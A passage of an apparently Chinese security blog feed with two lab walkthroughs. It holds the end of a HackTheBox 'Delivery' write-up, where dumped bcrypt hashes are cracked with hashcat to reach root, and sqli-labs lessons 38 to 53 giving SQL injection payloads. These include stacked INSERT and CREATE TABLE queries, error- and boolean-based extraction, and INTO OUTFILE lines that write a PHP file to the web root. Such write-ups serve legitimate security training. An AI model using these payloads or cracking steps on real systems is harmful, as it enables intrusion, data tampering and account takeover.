$2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |</span><br><span class="line">| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |</span><br><span class="line">| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |</span><br><span class="line">| tvfarrugia                       | $2a$10$o6yxtpE/NKKwAoDDmhvlYOFKQYeFpiaZzdXm9cngdLybreqIyNiC2 |</span><br><span class="line">| channelexport                    |                                                              |</span><br><span class="line">| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |</span><br><span class="line">| tvfarrugia123                    | $2a$10$1ons3/hCS7HSaQvz2xUWTOIzIbEdz.F8RA5XzhBov2f8QlyhkHm9W |</span><br><span class="line">| qqq                              | $2a$10$HyASuwVYXhyUrD6hItnA4u4xFoHsZ8umKx3NmtmxzNZb/8krIrirG |</span><br><span class="line">| demo                             | $2a$10$GFyQMEbrkoWZ19WrFN6blu.eoniX0Lm44bMGkfhNSEiU.Lt.vAwcC |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">15 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt;</span><br></pre></td></tr></table></figure><p><code>得到root用户密码的hash值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO</span></span><br></pre></td></tr></table></figure><p><code>生成定制字典</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -r /usr/share/hashcat/rules/best64.rule --stdout rule.txt &gt; word.list</span><br><span class="line">root@JIYE:~/htb/delivery# wc -l word.list </span><br><span class="line">77 word.list</span><br><span class="line">root@JIYE:~/htb/delivery# cat rule.txt </span><br><span class="line">PleaseSubscribe!</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><p><code>碰撞</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;crypt&quot;</span><br><span class="line">     --truecrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --truecrypt-keyf=x.png</span><br><span class="line">     --veracrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --veracrypt-keyf=x.txt</span><br><span class="line">     --veracrypt-pim-start      | Num  | VeraCrypt personal iterations multiplier start       | --veracrypt-pim-start=450</span><br><span class="line">     --veracrypt-pim-stop       | Num  | VeraCrypt personal iterations multiplier stop        | --veracrypt-pim-stop=500</span><br><span class="line">     --scrypt-tmto              | Num  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3</span><br><span class="line">   8900 | scrypt                                           | Generic KDF</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating System</span><br><span class="line">   1500 | descrypt, DES (Unix), Traditional DES            | Operating System</span><br><span class="line">   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating System</span><br><span class="line">   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System</span><br><span class="line">   9300 | Cisco-IOS $9$ (scrypt)                           | Operating System</span><br><span class="line">  15100 | Juniper/NetBSD sha1crypt                         | Operating System</span><br><span class="line">   7401 | MySQL $A$ (sha256crypt)                          | Database Server</span><br><span class="line">  12200 | eCryptfs                                         | Full-Disk Encryption (FDE)</span><br><span class="line">  22400 | AES Crypt (SHA256)                               | Full-Disk Encryption (FDE)</span><br><span class="line">  14600 | LUKS                                             | Full-Disk Encryption (FDE)</span><br><span class="line">  13711 | VeraCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13751 | VeraCrypt SHA256 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13752 | VeraCrypt SHA256 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13753 | VeraCrypt SHA256 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode       | Full-Disk Encryption (FDE)</span><br><span class="line">  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode      | Full-Disk Encryption (FDE)</span><br><span class="line">  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode      | Full-Disk Encryption (FDE)</span><br><span class="line">  13721 | VeraCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13722 | VeraCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13723 | VeraCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13771 | VeraCrypt Streebog-512 + XTS 512 bit             | Full-Disk Encryption (FDE)</span><br><span class="line">  13772 | VeraCrypt Streebog-512 + XTS 1024 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13773 | VeraCrypt Streebog-512 + XTS 1536 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13731 | VeraCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13732 | VeraCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13733 | VeraCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  16700 | FileVault 2                                      | Full-Disk Encryption (FDE)</span><br><span class="line">  20011 | DiskCryptor SHA512 + XTS 512 bit                 | Full-Disk Encryption (FDE)</span><br><span class="line">  20012 | DiskCryptor SHA512 + XTS 1024 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  20013 | DiskCryptor SHA512 + XTS 1536 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  22100 | BitLocker                                        | Full-Disk Encryption (FDE)</span><br><span class="line">  12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)</span><br><span class="line">   8800 | Android FDE &lt;= 4.3                               | Full-Disk Encryption (FDE)</span><br><span class="line">  18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)</span><br><span class="line">   6211 | TrueCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6221 | TrueCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">   6222 | TrueCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6223 | TrueCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6231 | TrueCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6232 | TrueCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6233 | TrueCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  22700 | MultiBit HD (scrypt)                             | Password Managers</span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;bcrypt&quot;</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list</span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 1408/1472 MB (512 MB allocatable), 4MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 72</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 65 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: word.list</span><br><span class="line">* Passwords.: 77</span><br><span class="line">* Bytes.....: 1177</span><br><span class="line">* Keyspace..: 77</span><br><span class="line">* Runtime...: 0 secs</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: bcrypt $2*$, Blowfish (Unix)</span><br><span class="line">Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO</span><br><span class="line">Time.Started.....: Wed Feb  3 19:25:48 2021 (1 sec)</span><br><span class="line">Time.Estimated...: Wed Feb  3 19:25:49 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (word.list)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:       28 H/s (7.82ms) @ Accel:4 Loops:32 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 32/77 (41.56%)</span><br><span class="line">Rejected.........: 0/32 (0.00%)</span><br><span class="line">Restore.Point....: 16/77 (20.78%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024</span><br><span class="line">Candidates.#1....: PleaseSubscribe!02 -&gt; PleaseSubscribs</span><br><span class="line"></span><br><span class="line">Started: Wed Feb  3 19:25:09 2021</span><br><span class="line">Stopped: Wed Feb  3 19:25:50 2021</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list --show</span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><p><code>得到密码PleaseSubscribe!21</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@Delivery:/home/maildeliverer# whoami</span><br><span class="line">root</span><br><span class="line">root@Delivery:/# cd ~</span><br><span class="line">root@Delivery:~# ls</span><br><span class="line">mail.sh  note.txt  py-smtp.py  root.txt</span><br><span class="line">root@Delivery:~# cat root.txt </span><br><span class="line">***************************</span><br><span class="line">root@Delivery:~#</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL2ludGlncml0aS9ob3ctaS1oYWNrZWQtaHVuZHJlZHMtb2YtY29tcGFuaWVzLXRocm91Z2gtdGhlaXItaGVscGRlc2stYjc2ODBkZGMyZDRj">大佬的灵感respect<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/02/04/HTB-delivery/image-20210203224703300.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page3(stacked)</title>
    <link href="https://lunamoore.github.io/2021/02/02/Sqli-labs-Page3-stack/"/>
    <id>https://lunamoore.github.io/2021/02/02/Sqli-labs-Page3-stack/</id>
    <published>2021-02-02T03:38:50.000Z</published>
    <updated>2021-02-02T03:49:07.830Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page3(stacked)</strong></p><p><strong>本篇大部分考察堆叠注入</strong></p><a id="more"></a><h2 id="0x01-Less-38-GET-堆叠注入-单引号"><a href="#0x01-Less-38-GET-堆叠注入-单引号" class="headerlink" title="0x01.Less-38 GET 堆叠注入 单引号"></a>0x01.Less-38 GET 堆叠注入 单引号</h2><p><code>使用堆叠注入可以进行增删改查等操作</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),3;insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure><p><code>爆库爆表爆字段等操作不在赘述，先查看未注入之前的数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130856987.png" class><p><code>再查看注入之后的数据</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130944171.png" class><h2 id="0x02-Less-39-GET-堆叠注入-整型"><a href="#0x02-Less-39-GET-堆叠注入-整型" class="headerlink" title="0x02.Less-39 GET 堆叠注入 整型"></a>0x02.Less-39 GET 堆叠注入 整型</h2><p><code>同less-38，将单引号去掉即可</code></p><h2 id="0x03-Less-40-GET-基于bool-堆叠注入-单引号-括号"><a href="#0x03-Less-40-GET-基于bool-堆叠注入-单引号-括号" class="headerlink" title="0x03.Less-40 GET 基于bool 堆叠注入 单引号+括号"></a>0x03.Less-40 GET 基于bool 堆叠注入 单引号+括号</h2><p><code>bool注入不在赘述，使用如下payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;);insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure><p><code>查看，可以看到插入成功</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201133805018.png" class><h2 id="0x04-Less-41-GET-基于bool-堆叠注入-整型"><a href="#0x04-Less-41-GET-基于bool-堆叠注入-整型" class="headerlink" title="0x04.Less-41 GET 基于bool 堆叠注入 整型"></a>0x04.Less-41 GET 基于bool 堆叠注入 整型</h2><p><code>同less-40，去掉&#39;)即可</code></p><h2 id="0x05-Less-42-POST-基于报错-堆叠注入"><a href="#0x05-Less-42-POST-基于报错-堆叠注入" class="headerlink" title="0x05.Less-42 POST 基于报错 堆叠注入"></a>0x05.Less-42 POST 基于报错 堆叠注入</h2><p><code>这里点击注册用户出现如下页面</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201135038039.png" class><p><code>查看源码发现，password没有进行过滤，此处可以进行注入</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure><p><code>测试发现闭合字符为单引号</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201141358328.png" class><p><code>注入</code></p><blockquote><p>这里没有想到好的办法进行爆库爆表爆字段（菜是原罪。。。）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(55,&#39;de&#39;,&#39;de&#39;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142502360.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142524651.png" class><h2 id="0x06-Less-43-POST-基于报错-堆叠注入-单引号-括号"><a href="#0x06-Less-43-POST-基于报错-堆叠注入-单引号-括号" class="headerlink" title="0x06.Less-43 POST 基于报错 堆叠注入 单引号+括号"></a>0x06.Less-43 POST 基于报错 堆叠注入 单引号+括号</h2><p><code>同less-42，将单引号换为&#39;)即可</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(66,&#39;ha&#39;,&#39;ha&#39;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201143741102.png" class><h2 id="0x07-Less-44-POST-基于报错-堆叠注入blind"><a href="#0x07-Less-44-POST-基于报错-堆叠注入blind" class="headerlink" title="0x07.Less-44 POST 基于报错 堆叠注入blind"></a>0x07.Less-44 POST 基于报错 堆叠注入blind</h2><p><code>同less42，但此处&#39;无回显</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(32,&#x27;demo&#x27;,&#x27;demo&#x27;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201144925798.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145028708.png" class><h2 id="0x08-Less-45-POST-基于报错-堆叠注入blind"><a href="#0x08-Less-45-POST-基于报错-堆叠注入blind" class="headerlink" title="0x08.Less-45 POST 基于报错 堆叠注入blind"></a>0x08.Less-45 POST 基于报错 堆叠注入blind</h2><p><code>同less42，闭合字符为&#39;)，仍然无回显</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145317106.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145302646.png" class><h2 id="0x09-Less-46-GET-基于报错-数字-order-by"><a href="#0x09-Less-46-GET-基于报错-数字-order-by" class="headerlink" title="0x09.Less-46 GET 基于报错 数字 order by"></a>0x09.Less-46 GET 基于报错 数字 order by</h2><p><code>查看源码发现sql语句如下</code></p><blockquote><p>order by 不同于where，order by 后不能拼接union</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY $id&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>直接构造报错语句，其他过程不在赘述</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201233943796.png" class><p><strong>skip</strong></p><p><code>这里可以使用into outfile配合lines  terminated by 0x写入webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and into outfile &quot;C:\\phpStudy\\WWW\\less46.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure><blockquote><p>这里由于没有权限所以失败了，但这也是一个不错的思路。</p></blockquote><h2 id="0x10-Less-47-GET-基于报错-字符-order-by"><a href="#0x10-Less-47-GET-基于报错-字符-order-by" class="headerlink" title="0x10.Less-47 GET 基于报错 字符 order by"></a>0x10.Less-47 GET 基于报错 字符 order by</h2><p><code>同上，闭合字符为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=0&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202000047262.png" class><h2 id="0x11-Less-48-GET-基于bool-数字-order-by"><a href="#0x11-Less-48-GET-基于bool-数字-order-by" class="headerlink" title="0x11.Less-48 GET 基于bool 数字 order by"></a>0x11.Less-48 GET 基于bool 数字 order by</h2><p><code>这里使用rand()函数进行回显判断</code></p><blockquote><p>rand(0)如下</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001551841.png" class><blockquote><p>rand(1)如下</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001610943.png" class><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(left((select database()),1)=&#x27;a&#x27;)</span><br><span class="line">?sort=rand(left((select database()),1)=&#x27;s&#x27;)</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001526992.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001730347.png" class><blockquote><p>其他过程不在赘述</p></blockquote><h2 id="0x12-Less-49-GET-基于bool-字符-order-by"><a href="#0x12-Less-49-GET-基于bool-字符-order-by" class="headerlink" title="0x12.Less-49 GET 基于bool 字符 order by"></a>0x12.Less-49 GET 基于bool 字符 order by</h2><p><code>同上，闭合字符为单引号，本次使用导出文件上传webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27; and into outfile &quot;/var/www/html/Less-49/demo.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure><blockquote><p>这里3c3f7068700a706870696e666f28293b0a3f3e为<?php phpinfo();?>的16进制</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202004930920.png" class><h2 id="0x13-Less-50-基于报错-GET-order-by-数字-堆叠注入"><a href="#0x13-Less-50-基于报错-GET-order-by-数字-堆叠注入" class="headerlink" title="0x13.Less-50 基于报错 GET order by 数字 堆叠注入"></a>0x13.Less-50 基于报错 GET order by 数字 堆叠注入</h2><p><code>查看源码发现，将mysql_query()函数换为了mysqli_multi_query()函数 ，可以多语句查询，所以可以使用堆叠注入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table demo like users; -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202111325863.png" class><p><code>其他过程不在赘述</code></p><h2 id="0x014-Less-51-基于报错-GET-order-by-字符-堆叠注入"><a href="#0x014-Less-51-基于报错-GET-order-by-字符-堆叠注入" class="headerlink" title="0x014.Less-51 基于报错 GET order by 字符 堆叠注入"></a>0x014.Less-51 基于报错 GET order by 字符 堆叠注入</h2><p><code>同上，闭合字符为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table demo like users; -- -</span><br></pre></td></tr></table></figure><h2 id="0x15-Less-52-基于bool-GET-order-by-数字-堆叠注入"><a href="#0x15-Less-52-基于bool-GET-order-by-数字-堆叠注入" class="headerlink" title="0x15.Less-52 基于bool GET order by 数字 堆叠注入"></a>0x15.Less-52 基于bool GET order by 数字 堆叠注入</h2><p><code>同上直接堆叠注入即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table hade like users; -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202112340757.png" class><h2 id="0x16-Less-53-基于bool-GET-order-by-字符-堆叠注入"><a href="#0x16-Less-53-基于bool-GET-order-by-字符-堆叠注入" class="headerlink" title="0x16.Less-53 基于bool GET order by 字符 堆叠注入"></a>0x16.Less-53 基于bool GET order by 字符 堆叠注入</h2><p><code>同上，闭合字符为单引号，直接堆叠注入即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table qq like users; -- -</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page3(stacked)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本篇大部分考察堆叠注入&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
